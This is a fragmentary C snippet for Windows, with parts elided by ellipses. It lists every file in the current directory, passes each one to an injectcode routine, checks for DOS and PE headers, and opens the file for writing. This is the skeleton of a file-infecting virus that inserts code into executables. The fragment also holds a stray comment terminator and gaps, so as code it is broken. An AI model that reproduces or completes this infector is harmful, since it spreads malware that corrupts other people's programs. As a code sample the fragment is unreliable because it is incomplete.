...
int injectcode(LPCTSTR filename);
int main()
{
	WIN32_FIND_DATA finddata;
	HANDLE hnd;
	if ((int)(hnd = FindFirstFile(L"*.*", &finddata)) != -1)
	{
		do
		{
			if (!(finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				injectcode(finddata.cFileName);
			}
			...
			*/
			if (dos_header->e_magic == IMAGE_DOS_SIGNATURE)
			{
				...
				if (header->Signature == IMAGE_NT_SIGNATURE)
				{
					...
					HANDLE hWrite = CreateFile(filename, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);
